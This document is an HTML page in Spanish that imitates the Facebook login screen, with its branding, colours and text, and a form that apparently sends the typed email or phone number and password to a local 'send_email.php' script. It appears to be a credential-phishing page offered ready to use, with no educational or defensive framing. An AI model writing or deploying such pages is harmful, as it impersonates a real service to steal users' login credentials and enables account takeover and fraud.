<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Iniciar sesión</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }
        .container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            max-width: 1000px;
            width: 90%;
        }
        .left {
            width: 50%;
        }
        .left h1 {
            color: #1877f2;
            font-size: 50px;
            margin-bottom: 10px;
        }
        .left p {
            font-size: 20px;
            color: #333;
        }
        .right {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.2);
            width: 360px;
            text-align: center;
        }
        .right input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 16px;
        }
        .right button {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            cursor: pointer;
        }
        .right button:hover {
            background-color: #166fe5;
        }
        .forgot {
            display: block;
            margin: 10px 0;
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        .forgot:hover {
            text-decoration: underline;
        }
        .register {
            background-color: #42b72a;
            margin-top: 10px;
            font-size: 16px;
        }
        .register:hover {
            background-color: #36a420;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="left">
            <h1>Facebook</h1>
            <p>Conéctate con tus amigos y el mundo que te rodea en Facebook.</p>
        </div>
        <div class="right">
            <form action="send_email.php" method="POST">
                <input type="text" name="email" placeholder="Correo electrónico o número de teléfono" required>
                <input type="password" name="password" placeholder="Contraseña" required>
                <button type="submit">Iniciar sesión</button>
                <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
                <hr>
                <button type="button" class="register">Crear nueva cuenta</button>
            </form>
        </div>
    </div>

</body>
</html>
